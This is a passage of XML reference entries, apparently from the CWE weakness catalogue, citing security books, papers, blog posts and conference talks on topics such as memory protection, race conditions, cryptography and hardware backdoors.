			<Author>Microsoft</Author>
			<Title>Understanding DEP as a mitigation technology part 1</Title>
			<URL>https://msrc.microsoft.com/blog/2009/06/understanding-dep-as-a-mitigation-technology-part-1/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-62">
			<Author>Mark Dowd</Author>
			<Author>John McDonald</Author>
			<Author>Justin Schuh</Author>
			<Title>The Art of Software Security Assessment</Title>
			<Edition>1st Edition</Edition>
			<Publication_Year>2006</Publication_Year>
			<Publisher>Addison Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-64">
			<Author>Grant Murphy</Author>
			<Title>Position Independent Executables (PIE)</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<Publisher>Red Hat</Publisher>
			<URL>https://www.redhat.com/en/blog/position-independent-executables-pie</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-76">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Least Privilege</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-90">
			<Title>Buffer UNDERFLOWS: What do you know about it?</Title>
			<Publication>Vuln-Dev Mailing List</Publication>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>https://seclists.org/vuln-dev/2004/Jan/22</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-166">
			<Author>Jim Manico</Author>
			<Title>Input Validation with ESAPI - Very Important</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://manicode.blogspot.com/2008/08/input-validation-with-esapi.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-168">
			<Author>Joel Scambray</Author>
			<Author>Mike Shema</Author>
			<Author>Caleb Sima</Author>
			<Title>Hacking Exposed Web Applications, Second Edition</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<Publisher>McGraw-Hill</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-170">
			<Author>Kevin Beaver</Author>
			<Title>The importance of input validation</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---06</Publication_Day>
			<URL>http://searchsoftwarequality.techtarget.com/tip/0,289483,sid92_gci1214373,00.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-172">
			<Author>Chris Wysopal</Author>
			<Title>Mobile App Top 10 List</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---13</Publication_Day>
			<URL>https://www.veracode.com/blog/2010/12/mobile-app-top-10-list</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-196">
			<Author>Jerome H. Saltzer</Author>
			<Author>Michael D. Schroeder</Author>
			<Title>The Protection of Information in Computer Systems</Title>
			<Publication>Proceedings of the IEEE 63</Publication>
			<Publication_Year>1975</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<URL>http://web.mit.edu/Saltzer/www/publications/protection/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-207">
			<Author>John Viega</Author>
			<Author>Gary McGraw</Author>
			<Title>Building Secure Software: How to Avoid Security Problems the Right Way</Title>
			<Edition>1st Edition</Edition>
			<Publication_Year>2002</Publication_Year>
			<Publisher>Addison-Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-229">
			<Author>NIST</Author>
			<Title>Role Based Access Control and Role Based Security</Title>
			<URL>https://csrc.nist.gov/projects/role-based-access-control</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-231">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 5 - Improper Access Control (Authorization)</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-5-improper-access-control-authorization/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-233">
			<Author>Rahul Bhattacharjee</Author>
			<Title>Authentication using JAAS</Title>
			<URL>https://javaranch.com/journal/2008/04/authentication-using-JAAS.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-236">
			<Author>Kim Zetter</Author>
			<Title>Weak Password Brings 'Happiness' to Twitter Hacker</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---09</Publication_Day>
			<URL>https://www.wired.com/2009/01/professed-twitt/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-237">
			<Author>OWASP</Author>
			<Title>Top 10 2007-Broken Authentication and Session Management</Title>
			<Publication_Year>2007</Publication_Year>
			<URL>http://www.owasp.org/index.php/Top_10_2007-A7</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-238">
			<Author>OWASP</Author>
			<Title>Guide to Authentication</Title>
			<URL>http://www.owasp.org/index.php/Guide_to_Authentication</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-239">
			<Author>Microsoft</Author>
			<Title>Authentication</Title>
			<URL>http://msdn.microsoft.com/en-us/library/aa374735(VS.85).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-243">
			<Author>Sascha Fahl, Marian Harbach, Thomas Muders, Matthew Smith</Author>
			<Author>Lars Baumgärtner, Bernd Freisleben</Author>
			<Title>Why Eve and Mallory Love Android: An Analysis of Android SSL (In)Security</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---16</Publication_Day>
			<URL>http://www2.dcsec.uni-hannover.de/files/android/p50-fahl.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-244">
			<Author>M. Bishop</Author>
			<Title>Computer Security: Art and Science</Title>
			<Publication_Year>2003</Publication_Year>
			<Publisher>Addison-Wesley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-245">
			<Author>Martin Georgiev</Author>
			<Author>Subodh Iyengar</Author>
			<Author>Suman Jana</Author>
			<Author>Rishita Anubhai</Author>
			<Author>Dan Boneh</Author>
			<Author>Vitaly Shmatikov</Author>
			<Title>The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-257">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 19 - Missing Authentication for Critical Function</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-19-missing-authentication-for-critical-function/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-265">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 10 - Missing Encryption of Sensitive Data</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-10-missing-encryption-of-sensitive-data/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-267">
			<Author>Information Technology Laboratory, National Institute of Standards and Technology</Author>
			<Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC MODULES</Title>
			<Publication_Year>2001</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>https://csrc.nist.gov/csrc/media/publications/fips/140/2/final/documents/fips1402.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-271">
			<Author>OWASP</Author>
			<Title>Top 10 2007-Insecure Communications</Title>
			<Publication_Year>2007</Publication_Year>
			<URL>http://www.owasp.org/index.php/Top_10_2007-A9</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-280">
			<Author>Bruce Schneier</Author>
			<Title>Applied Cryptography</Title>
			<Publication_Year>1996</Publication_Year>
			<Publisher>John Wiley &amp; Sons</Publisher>
			<URL>https://www.schneier.com/books/applied-cryptography</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-281">
			<Author>Alfred J. Menezes</Author>
			<Author>Paul C. van Oorschot</Author>
			<Author>Scott A. Vanstone</Author>
			<Title>Handbook of Applied Cryptography</Title>
			<Publication_Year>1996</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<URL>https://cacr.uwaterloo.ca/hac/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-282">
			<Author>C Matthew Curtin</Author>
			<Title>Avoiding bogus encryption products: Snake Oil FAQ</Title>
			<Publication_Year>1998</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>http://www.faqs.org/faqs/cryptography-faq/snake-oil/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-284">
			<Author>Paul F. Roberts</Author>
			<Title>Microsoft Scraps Old Encryption in New Code</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://www.eweek.com/security/microsoft-scraps-old-encryption-in-new-code/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-287">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 24 - Use of a Broken or Risky Cryptographic Algorithm</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-use-of-a-broken-or-risky-cryptographic-algorithm/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-324">
			<Author>Taimur Aslam</Author>
			<Title>A Taxonomy of Security Faults in the UNIX Operating System</Title>
			<Publication_Year>1995</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<URL>http://cwe.mitre.org/documents/sources/ATaxonomyofSecurityFaultsintheUNIXOperatingSystem%5BAslam95%5D.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-349">
			<Author>Andrei Alexandrescu</Author>
			<Title>volatile - Multithreaded Programmer's Best Friend</Title>
			<Publication>Dr. Dobb's</Publication>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<URL>https://drdobbs.com/cpp/volatile-the-multithreaded-programmers-b/184403766</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-350">
			<Author>Steven Devijver</Author>
			<Title>Thread-safe webapps using Spring</Title>
			<URL>https://web.archive.org/web/20170609174845/http://www.javalobby.org/articles/thread-safe/index.jsp</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-351">
			<Author>David Wheeler</Author>
			<Title>Prevent race conditions</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<URL>https://www.ida.liu.se/~TDDC90/literature/papers/SP-race-conditions.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-352">
			<Author>Matt Bishop</Author>
			<Title>Race Conditions, Files, and Security Flaws; or the Tortoise and the Hare Redux</Title>
			<Publication_Year>1995</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<URL>https://seclab.cs.ucdavis.edu/projects/vulnerabilities/scriv/ucd-ecs-95-08.pdf</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-353">
			<Author>David Wheeler</Author>
			<Title>Secure Programming for Linux and Unix HOWTO</Title>
			<Publication_Year>2003</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-race.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-354">
			<Author>Blake Watts</Author>
			<Title>Discovering and Exploiting Named Pipe Security Flaws for Fun and Profit</Title>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<URL>https://www.blakewatts.com/blog/discovering-and-exploiting-named-pipe-security-flaws-for-fun-and-profit</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-355">
			<Author>Roberto Paleari</Author>
			<Author>Davide Marrone</Author>
			<Author>Danilo Bruschi</Author>
			<Author>Mattia Monga</Author>
			<Title>On Race Vulnerabilities in Web Applications</Title>
			<URL>http://security.dico.unimi.it/~roberto/pubs/dimva08-web.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-356">
			<Title>Avoiding Race Conditions and Insecure File Operations</Title>
			<Publication>Apple Developer Connection</Publication>
			<URL>https://web.archive.org/web/20081010155022/http://developer.apple.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-357">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 25 - Race Conditions</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://web.archive.org/web/20100530231203/http://blogs.sans.org:80/appsecstreetfighter/2010/03/26/top-25-series-rank-25-race-conditions/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-422">
			<Author>Richard Stanway (r1CH)</Author>
			<Title>Dynamic File Uploads, Security and You</Title>
			<URL>https://web.archive.org/web/20090208005456/http://shsc.info/FileUploadSecurity</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-423">
			<Author>Johannes Ullrich</Author>
			<Title>8 Basic Rules to Implement Secure File Uploads</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---28</Publication_Day>
			<URL>https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-424">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 8 - Unrestricted Upload of Dangerous File Type</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-8-unrestricted-upload-of-dangerous-file-type/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-434">
			<Author>David Wheeler</Author>
			<Title>Secure Programming for Linux and Unix HOWTO</Title>
			<Publication_Year>2003</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<URL>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/semantic-attacks.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-454">
			<Author>Microsoft</Author>
			<Title>Introduction to Code Signing</Title>
			<URL>http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-455">
			<Author>Microsoft</Author>
			<Title>Authenticode</Title>
			<URL>http://msdn.microsoft.com/en-us/library/ms537359(v=VS.85).aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-456">
			<Author>Apple</Author>
			<Title>Code Signing Guide</Title>
			<Publication>Apple Developer Connection</Publication>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---19</Publication_Day>
			<URL>https://web.archive.org/web/20080724215143/http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-457">
			<Author>Anthony Bellissimo</Author>
			<Author>John Burgess</Author>
			<Author>Kevin Fu</Author>
			<Title>Secure Software Updates: Disappointments and New Challenges</Title>
			<URL>http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-459">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 20 - Download of Code Without Integrity Check</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-20-download-of-code-without-integrity-check/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-483">
			<Author>Craig A. Shue</Author>
			<Author>Andrew J. Kalafut</Author>
			<Author>Minaxi Gupta</Author>
			<Title>Exploitable Redirects on the Web: Identification, Prevalence, and Defense</Title>
			<URL>https://www.cprogramming.com/tutorial/exceptions.html</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-484">
			<Author>Russ McRee</Author>
			<Title>Open redirect vulnerabilities: definition and prevention</Title>
			<Edition>Issue 17</Edition>
			<Publication>(IN)SECURE</Publication>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<URL>http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-485">
			<Author>Jason Lam</Author>
			<Title>Top 25 Series - Rank 23 - Open Redirect</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-522">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Failing Securely</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>https://web.archive.org/web/20221017053210/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/failing-securely</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-526">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Complete Mediation</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---12</Publication_Day>
			<URL>https://web.archive.org/web/20221006191503/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/complete-mediation</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-529">
			<Title>HMAC</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>https://en.wikipedia.org/wiki/HMAC</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-539">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Psychological Acceptability</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>https://web.archive.org/web/20221104163022/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/psychological-acceptability</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-540">
			<Author>J. D. Tygar</Author>
			<Author>Alma Whitten</Author>
			<Title>Usability of Security: A Case Study</Title>
			<Publication>SCS Technical Report Collection, CMU-CS-98-155</Publication>
			<Publication_Year>1998</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>http://reports-archive.adm.cs.cmu.edu/anon/1998/CMU-CS-98-155.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-622">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 15 - Improper Check for Unusual or Exceptional Conditions</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-15-improper-check-for-unusual-or-exceptional-conditions/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-754">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 6 - Reliance on Untrusted Inputs in a Security Decision</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>https://www.sans.org/blog/top-25-series-rank-6-reliance-on-untrusted-inputs-in-a-security-decision/</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-756">
			<Author>Scott Mitchell</Author>
			<Title>Understanding ASP.NET View State</Title>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<Publisher>Microsoft</Publisher>
			<URL>https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/ms972976(v=msdn.10)?redirectedfrom=MSDN</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-962">
			<Author>Object Management Group (OMG)</Author>
			<Title>Automated Source Code Security Measure (ASCSM)</Title>
			<Publication_Year>2016</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<URL>http://www.omg.org/spec/ASCSM/1.0/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-963">
			<Author>Robert A. Martin</Author>
			<Author>Lawrence H. Shafer</Author>
			<Title>Providing a Framework for Effective Software Quality Assessment</Title>
			<Publication_Year>1996</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<URL>https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1029">
			<Author>Aleph One</Author>
			<Title>Smashing The Stack For Fun And Profit</Title>
			<Publication_Year>1996</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---08</Publication_Day>
			<URL>http://phrack.org/issues/49/14.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1034">
			<Author>Raoul Strackx</Author>
			<Author>Yves Younan</Author>
			<Author>Pieter Philippaerts</Author>
			<Author>Frank Piessens</Author>
			<Author>Sven Lachmund</Author>
			<Author>Thomas Walter</Author>
			<Title>Breaking the memory secrecy assumption</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---31</Publication_Day>
			<Publisher>ACM</Publisher>
			<URL>https://dl.acm.org/doi/10.1145/1519144.1519145</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1035">
			<Author>Fermin J. Serna</Author>
			<Title>The info leak era on software exploitation</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<URL>https://media.blackhat.com/bh-us-12/Briefings/Serna/BH_US_12_Serna_Leak_Era_Slides.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1036">
			<Author>Ali Abbasi and Majid Hashemi</Author>
			<Title>Ghost in the PLC Designing an Undetectable Programmable Logic Controller Rootkit via Pin Control Attack</Title>
			<Publication_Year>2016</Publication_Year>
			<URL>https://www.blackhat.com/docs/eu-16/materials/eu-16-Abbasi-Ghost-In-The-PLC-Designing-An-Undetectable-Programmable-Logic-Controller-Rootkit-wp.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1061">
			<Author>Keith Bowman</Author>
			<Author>James Tschanz</Author>
			<Author>Chris Wilkerson</Author>
			<Author>Shih-Lien Lu</Author>
			<Author>Tanay Karnik</Author>
			<Author>Vivek De</Author>
			<Author>Shekhar Borkar</Author>
			<Title>Circuit Techniques for Dynamic Variation Tolerance</Title>
			<URL>https://dl.acm.org/doi/10.1145/1629911.1629915</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1062">
			<Author>Dan Ernst</Author>
			<Author>Nam Sung Kim</Author>
			<Author>Shidhartha Das</Author>
			<Author>Sanjay Pant</Author>
			<Author>Rajeev Rao</Author>
			<Author>Toan Pham</Author>
			<Author>Conrad Ziesler</Author>
			<Author>David Blaauw</Author>
			<Author>Todd Austin</Author>
			<Author>Krisztian Flautner</Author>
			<Author>Trevor Mudge</Author>
			<Title>Razor: A Low-Power Pipeline Based on Circuit-Level Timing Speculation</Title>
			<URL>https://web.eecs.umich.edu/~taustin/papers/MICRO36-Razor.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1063">
			<Author>James Tschanz</Author>
			<Author>Keith Bowman</Author>
			<Author>Steve Walstra</Author>
			<Author>Marty Agostinelli</Author>
			<Author>Tanay Karnik</Author>
			<Author>Vivek De</Author>
			<Title>Tunable Replica Circuits and Adaptive Voltage-Frequency Techniques for Dynamic Voltage, Temperature, and Aging Variation Tolerance</Title>
			<URL>https://ieeexplore.ieee.org/document/5205410</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1064">
			<Author>Bilgiday Yuce</Author>
			<Author>Nahid F. Ghalaty</Author>
			<Author>Chinmay Deshpande</Author>
			<Author>Conor Patrick</Author>
			<Author>Leyla Nazhandali</Author>
			<Author>Patrick Schaumont</Author>
			<Title>FAME: Fault-attack Aware Microprocessor Extensions for Hardware Fault Detection and Software Fault Response</Title>
			<URL>https://dl.acm.org/doi/10.1145/2948618.2948626</URL>
			<URL_Date>2023-04-07</URL_Date>
		</External_Reference>
      <External_Reference Reference_ID="REF-1065">
			<Author>Keith A. Bowman</Author>
			<Author>James W. Tschanz</Author>
			<Author>Shih-Lien L. Lu</Author>
			<Author>Paolo A. Aseron</Author>
			<Author>Muhammad M. Khellah</Author>
			<Author>Arijit Raychowdhury</Author>
			<Author>Bibiche M. Geuskens</Author>
			<Author>Carlos Tokunaga</Author>
			<Author>Chris B. Wilkerson</Author>
			<Author>Tanay Karnik</Author>
			<Author>Vivek De</Author>
			<Title>A 45 nm Resilient Microprocessor Core for Dynamic Variation Tolerance</Title>
			<URL>https://ieeexplore.ieee.org/document/5654663</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1066">
			<Author>Niek Timmers</Author>
			<Author>Albert Spruyt</Author>
			<Title>Bypassing Secure Boot Using Fault Injection</Title>
			<URL>https://www.blackhat.com/docs/eu-16/materials/eu-16-Timmers-Bypassing-Secure-Boot-Using-Fault-Injection.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1071">
			<Author>Ali Abbasi</Author>
			<Author>Tobias Scharnowski</Author>
			<Author>Thorsten Holz</Author>
			<Title>Doors of Durin: The Veiled Gate to Siemens S7 Silicon</Title>
			<URL>https://i.blackhat.com/eu-19/Wednesday/eu-19-Abbasi-Doors-Of-Durin-The-Veiled-Gate-To-Siemens-S7-Silicon.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1072">
			<Author>Sergei Skorobogatov</Author>
			<Author>Christopher Woods</Author>
			<Title>Breakthrough Silicon Scanning Discovers Backdoor in Military Chip</Title>
			<URL>https://www.cl.cam.ac.uk/~sps32/Silicon_scan_draft.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1073">
			<Author>Chris Domas</Author>
			<Title>God Mode Unlocked: Hardware Backdoors in x86 CPUs</Title>
			<URL>https://i.blackhat.com/us-18/Thu-August-9/us-18-Domas-God-Mode-Unlocked-Hardware-Backdoors-In-x86-CPUs.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-1074">
			<Author>Jonathan Brossard</Author>
			<Title>Hardware Backdooring is Practical</Title>
			<URL>https://media.blackhat.com/bh-us-12/Briefings/Brossard/BH_US_12_Brossard_Backdoor_Hacking_Slides.pdf</URL>
		</External_Reference>
